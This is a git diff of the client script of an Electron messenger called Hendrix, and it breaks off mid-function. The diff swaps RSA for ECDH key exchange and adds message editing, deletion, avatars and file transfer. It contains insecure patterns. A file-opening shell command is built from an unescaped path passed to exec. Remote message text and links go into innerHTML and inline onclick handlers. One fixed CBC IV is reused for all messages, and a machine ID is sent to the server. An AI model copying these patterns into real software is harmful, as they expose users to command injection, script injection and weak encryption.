@@ -22,21 +22,28 @@ webFrame.setZoomFactor(1);
 webFrame.setVisualZoomLevelLimits(1, 1);
 webFrame.setLayoutZoomLevelLimits(0, 0);
 
-const aes = require(`aes-js`);
-const RSA = require(`node-rsa`);
 const request = require(`request`);
 const crypto = require(`crypto`);
-const pbkdf2 = require(`pbkdf2`); //модуль для генерации сеансовых ключей и для хеширования паролей
+const pbkdf2 = require(`pbkdf2`);
+const jimp = require('jimp');
 const fs = require(`fs`);
 const path = require(`path`);
 const os = require(`os`);
+const v8 = require(`v8`);
 const util = require(`util`);
 const zlib = require(`zlib`);
 const WebSocket = require(`ws`);
+const net = require('net');
+const {machineIdSync} = require(`node-machine-id`);
+const child_process = require(`child_process`);
+const {exec} = child_process;
+const execAsync = util.promisify(exec);
+
+const defaultAvatar = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAACuElEQVR4Ae3BAQEAMAwCIG//znsQgXd3ATY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTCrAWY1wKwGmNUAsxpgVgPMaoBZDTDrA+fKBP2n2GLIAAAAAElFTkSuQmCC';
+
 const {
     Readable
 } = require(`stream`);
-const child_process = require(`child_process`);
 
 const queueSwal = swal => {
     const state = {
@@ -120,12 +127,14 @@ const encoding = `base64`;
 
 const hashPassword = password => pbkdf2.pbkdf2Sync(password, ``, 10, 32, `sha512`).toString(`hex`);
 
-const getDataProperty = async (data, key) => {
-    return encryptAES((await zlib.deflate(JSON.stringify(data))).toString(encoding), key);
+const getDataProperty = async (data) => {
+    data = Buffer.from(v8.serialize (data));
+    return encryptAES(data, user.cipherInfo.symmetricKey, user.cipherInfo.iv).toString(encoding);
 };
 
-const getDecryptedData = async (data, key) => {
-    return JSON.parse(await zlib.unzip(Buffer.from(decryptAES(data, key), encoding)));
+const getDecryptedData = async (data) => {
+    data = Buffer.from(data, user.serverEncoding);
+    return v8.deserialize(decryptAES(data, user.cipherInfo.symmetricKey, user.cipherInfo.iv));
 };
 
 fs.stat = util.promisify(fs.stat);
@@ -148,8 +157,6 @@ fs.readdir(hendrixdir, (err, data) => {
     }
 });
 
-//Битность ключей RSA, должна быть минимум 2048
-const b = 2048 //2048;
 //размер чанка при передачи файлов 262144
 const highWaterMark = 262144;
 
@@ -210,15 +217,16 @@ getElem(`createNewPerson`).addEventListener(`click`, () => {
     });
 });
 
-global.copyText = text => clipboard.writeText(text);
+global.showChangeDate = date => {
+    showMessageBox(`Изменено в ${dateFormatter.format(new Date(date))}`);
+};
+global.copyText = text => {
+    showMessageBox('Успешно скопировано в буфер обмена!');
+    clipboard.writeText(text);
+};
 global.openLink = link => shell.openExternal(link);
 global.openFile = fileId => {
     workerWindow.webContents.send('showItemInFolder', user.files[fileId].path);
-};
-global.openFileWithRightClick = (e, fileId) => {
-    if (e.button == 2) {
-        openFile(fileId);
-    }
 };
 global.describe = (description, num, showUsersInRoomAgain) => {
     const div = document.createElement(`div`);
@@ -236,10 +244,10 @@ global.describe = (description, num, showUsersInRoomAgain) => {
 
 const getOpenWileWithDefProgramCommand = process.platform == `linux` ? filePath => `xdg-open ${filePath}` : filePath => `start "" "${filePath}"`;
 
-global.openFileWithDefaultProgram = fileId => {
+global.openFileWithDefaultProgram = async fileId => {
     if (elements.openFilesInsecure.checked) {
         try {
-            exec(getOpenWileWithDefProgramCommand(user.files[fileId].path));
+            await execAsync(getOpenWileWithDefProgramCommand(user.files[fileId].path));
         } catch {}
     } else {
         showErrorModal(`Функция открытия файлов из мессенджера по умолчанию выключена в целях безопасности. Включите ее в настройках`);
@@ -273,7 +281,6 @@ const elements = {
     curVolume: getElem(`curVolume`),
     volume: getElem(`volume`),
     openFilesInsecure: getElem(`openFilesInsecure`),
-    RSAKeySize: getElem(`RSAKeySize`),
     money: getElem(`money`),
     moneyAccount: getElem(`moneyAccount`),
     oneToOneMessageSound: getElem(`oneToOneMessageSound`),
@@ -282,7 +289,26 @@ const elements = {
     audioRec: getElem(`audioRec`),
     webcamRec: getElem(`webcamRec`),
     screenRec: getElem(`screenRec`),
-    saveFilesNames: getElem(`saveFilesNames`)
+    saveFilesNames: getElem(`saveFilesNames`),
+    deleteTextMessage: getElem('deleteTextMessage'),
+    deleteYourFileMessage: getElem('deleteYourFileMessage'),
+    deleteFileMessage: getElem('deleteFileMessage'),
+    reconnect: getElem('reconnect'),
+    showMessagesSettings: getElem('showMessagesSettings'),
+    messagesSettings: getElem('messagesSettings'),
+    messagesBackgroundColor: getElem('messagesBackgroundColor'),
+    deletionMessageTimer: getElem('deletionMessageTimer'),
+    sendMessageTimer: getElem('sendMessageTimer'),
+    useNonStandardBackground: getElem('useNonStandardBackground'),
+    saveListIgnoredUsers: getElem('saveListIgnoredUsers'),
+    listIgnoredUsers: getElem('listIgnoredUsers'),
+    viewListIgnoredUsers: getElem('viewListIgnoredUsers'),
+    selectAvatar: getElem('selectAvatar'),
+    avatarPreview: getElem('avatarPreview'),
+    loadAvatar: getElem('loadAvatar'),
+    deleteAvatar: getElem('deleteAvatar'),
+    serverIp: getElem('serverIp'),
+    serverPort: getElem('serverPort')
 };
 
 ipcRenderer.send(`openWindow`);
@@ -322,9 +348,7 @@ const nowTypingList = {};
 
 const typingTimers = {};
 
-const {
-    server
-} = require(`./config`);
+let server;
 
 const sleep = time => new Promise(res => {
     setTimeout(() => {
@@ -345,48 +369,44 @@ const SSort = (func, a, ...args) => {
     }
 };
 
-const encryptAES = (text, key) => {
-    if (typeof key == `string`) {
-        key = Buffer.from(key, `hex`);
-    }
-    if (typeof text == `string`) {
-        text = Buffer.from(text);
-    }
-    const aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(14));
-    const encryptedBytes = aesCtr.encrypt(text);
-    return Buffer.from(encryptedBytes).toString(encoding);
-};
+const encryptAES = (data, key, iv) => {
+    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
+    let encrypted = cipher.update(data);
+    const final = cipher.final();
+    encrypted = Buffer.concat([encrypted, final]);
+    return encrypted;
+}
 
-const decryptAES = (text, key) => {
-    if (typeof key == `string`) {
-        key = Buffer.from(key, `hex`);
-    }
-    if (typeof text == `string`) {
-        text = Buffer.from(text, encoding);
-    }
-    const aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(14));
-    const decryptedBytes = aesCtr.decrypt(text);
-    return Buffer.from(decryptedBytes).toString();
+const decryptAES = (data, key, iv) => {
+    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
+    let decrypted = decipher.update(data);
+    decrypted = Buffer.concat([decrypted, decipher.final()]);
+    return decrypted;
 };
 
 const getRandomId = async (bytes = 32) => (await crypto.randomBytes(bytes)).toString(`hex`);
 
-const testKey = hashPassword(`test`);
-const testEncrypt = (text, key) => decryptAES(encryptAES(text, key), key) == text;
+const testCipher = {
+    symmetricKey: Buffer.from(hashPassword(`test`), 'hex'),
+    iv: Buffer.alloc(16)
+};
+const testEncrypt = (text, cipherInfo) => decryptAES(encryptAES(Buffer.from(text), cipherInfo.symmetricKey, cipherInfo.iv), cipherInfo.symmetricKey, cipherInfo.iv) == text;
 
 let waitReconnectTimer;
 
-const requestPostAsync = params => new Promise((resolve, reject) => {
+const requestPostAsync = (params, withoutTimer) => new Promise((resolve, reject) => {
     request.post(params, async (err, httpResponse, body) => {
         if (err && !waitReconnectTimer) {
-            waitReconnectTimer = true;
+            if (!withoutTimer) {
+                waitReconnectTimer = true;
+            }
             if (err.message.match(/(connect ECONNREFUSED)|(socket hang up)/i)) {
-                const {response} = (await dialog.showMessageBox(currentWindow, {
+                const {response} = await dialog.showMessageBox(currentWindow, {
                     type: `error`,
                     title: `Что-то пошло не так...`,
-                    message: `Сервер недоступен или вы не подключены к сети.`,
-                    buttons: [`Выйти из Hendrix`, `Перезапустить Hendrix`, `Подождать`],
-                }));
+                    message: `Вы не подключены к сети или неверно указали данные сервера. Что делать?`,
+                    buttons: [`Выйти из Hendrix`, `Перезапустить Hendrix`, `Ничего`],
+                });
                 switch(response) {
                     case 1:
                         remote.app.relaunch();
@@ -394,9 +414,11 @@ const requestPostAsync = params => new Promise((resolve, reject) => {
                         remote.app.quit();
                         break;
                     default:
-                        waitReconnectTimer = setTimeout(() => {
-                            waitReconnectTimer = false;
-                        }, 60000);
+                        if (!withoutTimer) {
+                            waitReconnectTimer = setTimeout(() => {
+                                waitReconnectTimer = false;
+                            }, 60000);
+                        }
                 }
             }
             return resolve(false);
@@ -412,28 +434,35 @@ const requestPostAsync = params => new Promise((resolve, reject) => {
 });
 
 const getFirstKeys = async () => {
-    const key = new RSA({
-        b
-    });
-    let getAESKey = await requestPostAsync({
-        url: `${server}/getAESKey`,
+    const ecdh = crypto.createECDH('secp521r1');
+    ecdh.generateKeys();
+    let syncSymmetricKey = await requestPostAsync({
+        url: `${server}/syncSymmetricKey`,
         form: {
-            key: key.exportKey(`pkcs8-public-pem`)
+            publicKey: ecdh.getPublicKey().toString(encoding),
+            encoding
         }
     });
-    user.aesKey = key.decrypt(Buffer.from(getAESKey.aeskeyencrypted, `hex`).toString(`base64`), `utf8`);
-    user.aesKeyBytes = Buffer.from(user.aesKey, `hex`);
+    const secret = ecdh.computeSecret(Buffer.from(syncSymmetricKey.publicKey, syncSymmetricKey.encoding));
+    user.cipherInfo = {
+        symmetricKey: secret.slice(1, 33),
+        iv: secret.slice(33, 49),
+        rest: secret.slice(49)
+    };
     user.secretString = await getRandomId();
+    user.serverEncoding = syncSymmetricKey.encoding;
+    user._machineId = hashPassword(machineIdSync({original: true}));
     const {userId} = await requestPostAsync({
         url: `${server}/savePerson`,
         form: {
-            pos: getAESKey.pos,
+            pos: syncSymmetricKey.pos,
             data: await getDataProperty({
                 name: user.name,
                 color: user.color,
                 secretString: user.secretString,
-                _token: user._token
-            }, user.aesKeyBytes)
+                _token: user._token,
+                _machineId: user._machineId //await getRandomId()|| 
+            })
         }
     });
     user._id = userId;
@@ -446,21 +475,25 @@ const updateKeys = async () => {
         buttons: false
     }, true);
     await sleep(300);
-    const key = new RSA({
-        b: +elements.RSAKeySize.value
-    });
-    let updateAESKey = await requestPostAsync({
-        url: `${server}/updateAESKey`,
+    const ecdh = crypto.createECDH('secp521r1');
+    ecdh.generateKeys();
+    let updateSymmetricKey = await requestPostAsync({
+        url: `${server}/updateSymmetricKey`,
         form: {
             data: await getDataProperty({
-                key: key.exportKey(`pkcs8-public-pem`),
+                publicKey: ecdh.getPublicKey().toString(encoding),
                 secretString: user.secretString
-            }, user.aesKeyBytes),
+            }),
             _id: user._id
         }
     });
-    user.aesKey = key.decrypt(Buffer.from(updateAESKey.aeskeyencrypted, `hex`).toString(`base64`), `utf8`);
-    user.aesKeyBytes = Buffer.from(user.aesKey, `hex`);
+    updateSymmetricKey = await getDecryptedData(updateSymmetricKey.data, user.serverEncoding);
+    const secret = ecdh.computeSecret(updateSymmetricKey.publicKey);
+    user.cipherInfo = {
+        symmetricKey: secret.slice(1, 33),
+        iv: secret.slice(33, 49),
+        rest: secret.slice(49)
+    };
     swal({
         text: `Обновление ключей завершено. Вы настоящий параноик!`,
         buttons: false
@@ -491,28 +524,34 @@ const showErrorDialog = async message => await dialog.showMessageBox(currentWind
     message
 });
 
+const showMessageBox = async message => await dialog.showMessageBox(currentWindow, {
+    title: 'Hendrix',
+    type: 'info',
+    message
+});
+
 const defaultServers = `<tbody><tr><th>Название комнаты</th><th>Участников</th><th>Защищена</th></tr>`;
 
 const showUsersInRoom = async () => {
     if (user.room) {
-        //отображаем все комныт, чтобы _id комнаты пользователя 100% был доступен
+        //отображаем все комнаты, чтобы _id комнаты пользователя 100% был доступен
         await showRooms();
         const room = rooms[user.room._id];
         if (!room) {
             return showErrorModal(`Нельзя просматривать участников скрытых комнат!`);
         }
-        let members = (await requestPostAsync({
+        let {members} = await requestPostAsync({
             url: `${server}/getUsersInRoom`,
             form: {
-                data: await getDataProperty(user.room, user.aesKeyBytes),
+                data: await getDataProperty(user.room),
                 _id: user._id
             }
-        })).members;
+        });
         if (!members) {
             return;
         }
         let r = ``;
-        members = JSON.parse(decryptAES(members, user.aesKeyBytes));
+        members = await getDecryptedData(members);
         members.forEach(member => {
             let additional = ``;
             if (member.creator) {
@@ -534,6 +573,335 @@ const showUsersInRoom = async () => {
     }
 }
 
+const searchUpElement = (elem, selector) => elem.closest(selector);
+
+const fileMessageMenu = [
+    {
+        name: "Удалить",
+        fn: async function(target) {
+            const messageBlock = searchUpElement(target, '.fileMsg');
+            const messageId = messageBlock.getAttribute('messageid');
+            const fileId = messageBlock.getAttribute('fileid');
+            const userId = messageBlock.getAttribute('userid');
+            if (!messageId) {
+                return showErrorModal('Данное сообщение невозможно идентифицировать!');
+            }
+            if (user._id != userId) {
+                elements.deleteFileMessage.style.display = 'block';
+                const deleteFileMsg = await swal({
+                    title: 'Удаление сообщения',
+                    content: elements.deleteFileMessage,
+                    buttons: ['Нет', 'Да']
+                });
+                if (deleteFileMsg) {
+                    deleteElementWithAnimation(messageBlock);
+                    const filePath = path.join(hendrixdir, fileId);
+                    if (elements.deleteFileMessage.querySelector('#deleteFile').checked && fs.existsSync(filePath)) {
+                        fs.unlinkSync(filePath);
+                    }
+                }
+            } else {
+                elements.deleteYourFileMessage.style.display = 'block';
+                const deleteFileMsg = await swal({
+                    title: 'Удаление сообщения',
+                    content: elements.deleteYourFileMessage,
+                    buttons: ['Нет', 'Да']
+                });
+                if (deleteFileMsg) {
+                    deleteElementWithAnimation(messageBlock);
+                    const fileDeletion = elements.deleteYourFileMessage.querySelector('#deleteYourFile').checked;
+                    if (fileDeletion) {
+                        const filePath = path.join(hendrixdir, fileId);
+                        if (fs.existsSync(filePath)) {
+                            fs.unlinkSync(filePath);
+                        }
+                    }
+                    if (elements.deleteYourFileMessage.querySelector('#deleteYourFileForAll').checked) {
+                        sendMessageToRoom({
+                            action: 'delete',
+                            messageId,
+                            fileDeletion,
+                            deleteId: messageId
+                        });
+                    }
+                }
+            }
+        }
+    },
+    {
+        name: "Сохранить как",
+        async fn(target) {
+            const fileId = searchUpElement(target, '.fileMsg').getAttribute('fileid');
+            if (fileId && fs.existsSync(path.join(hendrixdir, fileId))) {
+                const {filePath} = await dialog.showSaveDialog(currentWindow, {
+                    defaultPath: await getRandomId(12),
+                    filters: [{
+                        name: '',
+                        extensions: [path.extname(fileId).slice(1)]
+                    }]
+                });
+                if (filePath) {
+                    fs.createReadStream(path.join(hendrixdir, fileId)).pipe(fs.createWriteStream(filePath));
+                }
+            } else {
+                showErrorModal('Файл не найден!');
+            }
+        }
+    },
+    {
+        name: "Показать",
+        fn(target) {
+            const fileId = searchUpElement(target, '.fileMsg').getAttribute('fileid');
+            if (fileId) {
+                openFile(fileId);
+            }
+        }
+    },
+    {
+        name: "Запустить",
+        fn(target) {
+            const fileId = searchUpElement(target, '.fileMsg').getAttribute('fileid');
+            if (fileId) {
+                openFileWithDefaultProgram(fileId);
+            }
+        }
+    }
+];
+
+const textMessageMenu = [
+    {
+        name: "Удалить",
+        fn: async function(target) {
+            const messageBlock = searchUpElement(target, '.textMsg');
+            const messageId = messageBlock.getAttribute('messageid');
+            const userId = messageBlock.getAttribute('userid');
+            if (user._id != userId) {
+                const deleteMsg = await swal({
+                    title: 'Удаление сообщения',
+                    text: 'Удалить сообщение?',
+                    buttons: ['Нет', 'Да']
+                });
+                if (deleteMsg) {
+                    deleteElementWithAnimation(messageBlock);
+                }
+            } else {
+                elements.deleteTextMessage.style.display = 'block';
+                const deleteMsg = await swal({
+                    title: 'Удаление сообщения',
+                    content: elements.deleteTextMessage,
+                    buttons: ['Нет', 'Да']
+                });
+                if (deleteMsg) {
+                    deleteElementWithAnimation(messageBlock);
+                    if (elements.deleteTextMessage.querySelector('#deleteForAll').checked) {
+                        sendMessageToRoom({
+                            action: 'delete',
+                            deleteId: messageId
+                        });
+                    }
+                }
+            }
+        }
+    },
+    {
+        name: "Изменить",
+        fn(target) {
+            const messageBlock = searchUpElement(target, '.textMsg');
+            const messageId = messageBlock.getAttribute('messageid');
+            const userId = messageBlock.getAttribute('userid');
+            if (userId != user._id) {
+                return showErrorModal('Изменить можно только свое сообщение!');
+            }
+            const pre = messageBlock.querySelector('.message');
+            pre.contentEditable = true;
+            pre.focus();
+            pre.addEventListener('keydown', pageUpDownEscChecker);
+            pre.addEventListener(`paste`, pasteInputHandler);
+            pre.addEventListener('blur', function () {
+                this.contentEditable = false;
+                pre.removeEventListener('keydown', pageUpDownEscChecker);
+                pre.removeEventListener(`paste`, pasteInputHandler);
+                sendMessageToRoom({
+                    action: 'changeMessage',
+                    changedId: messageId,
+                    content: pre.innerHTML
+                });
+            }, {
+                once: true
+            });
+        }
+    }
+];
+
+const pageUpDownEscChecker = function (e) {
+    if (/page((up)|(down))/i.test(e.key)) {
+        e.preventDefault();
+    } else if (/escape/i.test(e.key)) {
+        this.blur();
+    }
+};
+
+const deleteElementWithAnimation = element => {
+    let {height, padding} = getComputedStyle(element);
+    [height] = height.match(/\d+/g);
+    [padding] = padding.match(/\d+/g);
+    animate({
+        timing: t => t,
+        draw(progress) {
+            const coef = 1 - progress;
+            element.style.opacity = coef;
+            element.style.transform = `scale(1, ${coef})`;
+            element.style.height = `${coef * height}px`;
+            element.style.padding = `${coef * padding}px`;
+        },
+        duration: 250,
+        endAnimation() {
+            element.remove();
+        }
+    });
+};
+
+new ContextMenu('.textMsg', textMessageMenu);
+new ContextMenu('.fileMsg', fileMessageMenu);
+
+const createFileWebSocket = async room => {
+    const roomFileSocket = new WebSocket(`${server}/fileSocket?userId=${user._id}&roomData=${encodeURIComponent(await getDataProperty(room))}`);
+    roomFileSocket.on(`message`, (async function(data) {
+        const message = v8.deserialize(decryptAES(data, user.cipherInfo.symmetricKey, user.cipherInfo.iv));
+        let additional = ``;
+        if (message.confirmed) {
+            message.badges.forEach(bdg => {
+                additional += `<img src="styles/confirmed/${bdg.badge}.png" class="confirmed" onclick="describe('${bdg.description}', ${bdg.badge})">`;
+            });
+        }
+        const date = new Date();
+        const hours = date.getHours().toString();
+        const minutes = date.getMinutes().toString();
+        const seconds = date.getSeconds().toString();
+        message.date = date;
+        const {
+            ext,
+            fileId: tmpId,
+            filePart,
+            position,
+            progress
+        } = message.file;
+        const fileId = tmpId + ext;
+        if (fs.existsSync(path.join(hendrixdir, fileId)) && (!this.files[fileId] || !this.files[fileId].writeStream)) {
+            return;
+        }
+        if (message.file.ready) {
+            if (this.files[fileId].writeStream) {
+                if (this.files[fileId].positions[0] == 1 && this.files[fileId].positions.every((e, p, a) => !p || e - a[p - 1] == 1)) {
+                    this.files[fileId].writeStream.end();
+                    await waitWriteStream(this.files[fileId].writeStream);
+                } else {
+                    showErrorModal(`Файл ${this.files[fileId].path} повреждён!`);
+                }
+            }
+            const focusedWindow = BrowserWindow.getFocusedWindow();
+            if (this.showNotifications && (!focusedWindow || focusedWindow.id != currentWindow.id)) {
+                const note = {
+                    name: message.name,
+                    color: message.color
+                };
+                if (ext.match(/(png)|(jpg)|(gif)|(jpeg)/i)) {
+                    note.image = this.files[fileId].path;
+                }
+                ipcRenderer.send(`notification`, note);
+            }
+            delete this.files[fileId].writeStream;
+            delete this.files[fileId].parts;
+            delete this.files[fileId].positions;
+            let desc = this.files[fileId].info && this.files[fileId].info.description;
+            let ht = this.files[fileId].info && desc ? `<span>${desc}</span><br>` : ``;
+            this.files[fileId].fileMsg.msg.innerHTML =
+            `${ext.match(/(png)|(jpg)|(gif)|(jpeg)/i) ?
+            `<img src="${this.files[fileId].path}" style="max-width: 100%">`
+            : ext.match(/(mp3)|(wav)|(ogg)/i) ?
+            `<audio src="${this.files[fileId].path}" controls></audio>`
+            : ext.match(/(mp4)|(webm)|(ogv)/i) ?
+            `<video src="${this.files[fileId].path}" controls></video>`
+            : `<span class="readyFile"><span class="lnk" onclick="openFile('${fileId}')">${fileId}</span><img onclick="openFileWithDefaultProgram('${fileId}')" class="launchImage" src="styles/start.png" class="launcIcon">`}<br>${ht}</span>`;
+            delete this.files[fileId].fileMsg;
+            if (message.user == this._id && +elements.deletionMessageTimer.value) {
+                const {messageId} = this.files[fileId];
+                setTimeout(() => {
+                    sendMessageToRoom({
+                        action: 'delete',
+                        messageId,
+                        fileDeletion: true,
+                        deleteId: messageId
+                    });
+                }, elements.deletionMessageTimer.value * 1000);
+            }
+        } else {
+            if (!this.files[fileId]) {
+                const fileBlock = createMessageBlock(message.color, `<span onclick="copyText('${message.user}')" class="user">${message.name}</span>${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, message._id, message.user, fileId, message.user == user._id ? user.avatar : user.cachedAvatars[message.user]);
+                if (message.file.backgroundColor) {
+                    fileBlock.messageBlock.style.backgroundColor =  message.file.backgroundColor;
+                }
+                elements.dialog.appendChild(fileBlock.messageBlock);
+                animate({
+                    timing: circAnimateFunc,
+                    draw(progress) {
+                        fileBlock.messageBlock.style.opacity = progress;
+                    },
+                    duration: 200,
+                    endAnimation: () => {
+                        addMessageSound(message, this);
+                    }
+                });
+                scroll();
+                this.files[fileId] = {
+                    path: path.join(hendrixdir, `${fileId}`),
+                    positions: [position],
+                    fileMsg: fileBlock.childs.msgBlock,
+                    linkCreated: false,
+                    messageId: message._id
+                };
+                if (message.file.info) {
+                    this.files[fileId].info = message.file.info;
+                }
+                this.files[fileId].writeStream = fs.createWriteStream(this.files[fileId].path);
+                this.files[fileId].writeStream.write(filePart);
+            } else {
+                this.files[fileId].positions.push(position);
+                if (this.files[fileId].writeStream.writable) {
+                    this.files[fileId].writeStream.write(filePart);
+                }
+            }
+            if (!this.files[fileId].linkCreated) {
+                this.files[fileId].fileMsg.fileLink.innerHTML = `<span class="sendFile"><img src="styles/file.png" style="-webkit-user-select: none;height: 16px;margin-right: 5px;"><span class="lnk" onclick="openFile('${fileId}')">${fileId} </span></span>`;
+                this.files[fileId].linkCreated = true;
+            }
+            this.files[fileId].fileMsg.fileProgress.innerHTML = `(${(progress * 100).toFixed(3)}%)`;
+        }
+    }).bind(user));
+    user.roomFileSocket = roomFileSocket;
+    roomFileSocket.on(`close`, code => {
+        if (user.room) {
+            createFileWebSocket(user.room);
+        }
+    });
+};
+
+const sendMessageToRoom = message => {
+    if (user.room && user.roomSocket.readyState == WebSocket.OPEN) {
+        user.roomSocket.send(encryptAES(v8.serialize(message), user.cipherInfo.symmetricKey, user.cipherInfo.iv));
+    }
+};
+
+const dateFormatter = new Intl.DateTimeFormat("ru", {
+    weekday: "long",
+    year: "numeric",
+    month: "long",
+    day: "numeric",
+    hour: "numeric",
+    minute: "numeric",
+    second: "numeric"
+  });
+
 const connectToTheRoom = async (password, _id, color, name) => {
     const room = {
         password,
@@ -541,30 +909,225 @@ const connectToTheRoom = async (password, _id, color, name) => {
         color,
         name
     };
-    user.room = room;
-    const logIn = (await requestPostAsync({
-        url: `${server}/logIn`,
-        form: {
-            data: await getDataProperty(user.room, user.aesKeyBytes),
-            _id: user._id
-        }
-    })).logIn;
-    if (logIn) {
-        user.subscribe();
+    if (user.roomsHistory[_id]) {
+        elements.dialog.innerHTML = user.roomsHistory[_id];
+        elements.dialog.dispatchEvent(new CustomEvent(`scroll`));
     }
-    getElem(`message`).style.display = `flex`;
+    const roomSocket = new WebSocket(`${server}/logIn?userId=${user._id}&roomData=${encodeURIComponent(await getDataProperty(room))}`);
+    roomSocket.on(`message`, (async function(data) {
+        const date = new Date();
+        const message = v8.deserialize(decryptAES(data, user.cipherInfo.symmetricKey, user.cipherInfo.iv));
+        if (message.action) {
+            switch (message.action) {
+                case 'connected':
+                    const {connectedId} = message;
+                    if (connectedId != user._id) {
+                        user.cachedAvatars[connectedId] = message.avatar;
+                    }
+                    break;
+                case 'disconnected':
+                    const {disconnectedId} = message;
+                    delete user.cachedAvatars[disconnectedId];
+                    break;
+                case 'typing':
+                    if (message.user != this._id) {
+                        nowTypingList[message.user] = `<span style="color:${message.color}"><b>${message.name}</b></span>`;
+                        if (typingTimers[message.user]) {
+                            clearTimeout(typingTimers[message.user]);
+                        }
+                        typingTimers[message.user] = setTimeout(() => {
+                            delete nowTypingList[message.user];
+                        }, 5000);
+                    }
+                    break;
+                case 'delete':
+                    const deletedMessage = document.querySelector(`[messageid="${message.deleteId}"]`);
+                    const dumpDeleteIndex = this._dump.findIndex(msg => msg._id == message.deleteId);
+                    if (~dumpDeleteIndex) {
+                        this._dump.splice(dumpDeleteIndex, 1);
+                    }
+                    if (deletedMessage && message.user == deletedMessage.getAttribute('userid')) {
+                        deleteElementWithAnimation(deletedMessage);
+                        if (message.fileDeletion) {
+                            const filePath = path.join(hendrixdir, deletedMessage.getAttribute('fileid'));
+                            if (fs.existsSync(filePath)) {
+                                fs.unlinkSync(filePath);
+                            }
+                        }
+                    }
+                    break;
+                case 'changeMessage':
+                    const changedMessage = document.querySelector(`[messageid="${message.changedId}"]`);
+                    if (changedMessage && message.user == changedMessage.getAttribute('userid')) {
+                        changedMessage.querySelector('.message').innerHTML = parseStyles(message.content);
+                        const nameBlock = changedMessage.querySelector('.name');
+                        let changeSpan = nameBlock.querySelector('.changeBlock');
+                        if (!changeSpan) {
+                            changeSpan = document.createElement('span');
+                            changeSpan.classList.add('changeBlock');
+                            changeSpan.textContent = 'Изменено';
+                            nameBlock.appendChild(changeSpan);
+                        }
+                        changeSpan.setAttribute('onclick', `showChangeDate('${date.toString()}')`);
+                    }
+                    break;
+                case 'changeAvatar':
+                    if (message.user != user._id) {
+                        user.cachedAvatars[message.user] = message.newAvatar;
+                    }
+                    break;
+            }
+            if (!message.system) {
+                return;
+            }
+        }
+        let additional = ``;
+        if (message.confirmed) {
+            message.badges.forEach(bdg => {
+                additional += `<img src="styles/confirmed/${bdg.badge}.png" class="confirmed" onclick="describe('${bdg.description}', ${bdg.badge})">`;
+            });
+        }
+        const hours = date.getHours().toString();
+        const minutes = date.getMinutes().toString();
+        const seconds = date.getSeconds().toString();
+        message.date = date;
+        if (nowTypingList[message.user] && typingTimers[message.user]) {
+            clearTimeout(typingTimers[message.user]);
+            delete typingTimers[message.user];
+            delete nowTypingList[message.user];
+        }
+        const obj = {
+            '<': `&lt;`,
+            '>': `&gt;`
+        };
+        let {message: text} = message;
+        text = text.replace(/(<)|(>)/g, match => obj[match]).replace(/\b(((https?|ftp):\/\/|www\.)[^\s]+)/g, link => `<span class="lnk" onclick="openLink('${link}');">${link}</span>`);
+        text = parseStyles(text); //парсим мои стили
+        message.message = text;
+        this._dump.push(message);
+        let nameBlock;
+        if (message.user) {
+            nameBlock = `<span onclick="copyText('${message.user}')" class="user" style="color:${message.color}">${message.name}</span>`;
+        } else {
+            nameBlock = `<span style="color:${message.color}">${message.name}</span>`;;
+        }
+        elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock({
+            nameBlock: `${nameBlock}${additional}`,
+            date: `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`,
+            message: text,
+            backgroundClr: message.backgroundColor,
+            messageId: message._id,
+            userId: message.user || message.name,
+            backgroundImg: message.user == user._id ? user.avatar : user.cachedAvatars[message.user]
+        }));
+        elements.dialog.dispatchEvent(new CustomEvent(`scroll`));
+        const messageElement = document.querySelector(`[messageid="${message._id}"]`);
         animate({
-            timing: makeEaseOut(circAnimateFunc),
+            timing: circAnimateFunc,
             draw(progress) {
-                elements.chat.style.gridTemplateRows = `minmax(18px, 3vh) ${100 - 20 * progress}vh 3vh 11vh 5vh`;
+                messageElement.style.opacity = progress;
             },
-            duration: 200
+            duration: 200,
+            endAnimation: () => {
+                addMessageSound(message, this);
+            }
         });
+        if (message.user == this._id && +elements.deletionMessageTimer.value) {
+            setTimeout(() => {
+                sendMessageToRoom({
+                    action: 'delete',
+                    deleteId: message._id
+                });
+            }, elements.deletionMessageTimer.value * 1000);
+        }
+        const focusedWindow = BrowserWindow.getFocusedWindow();
+        if (message.name && message.message && message.color && this.showNotifications && (!focusedWindow || focusedWindow.id != currentWindow.id)) {
+            ipcRenderer.send(`notification`, {
+                name: message.name,
+                text: message.message,
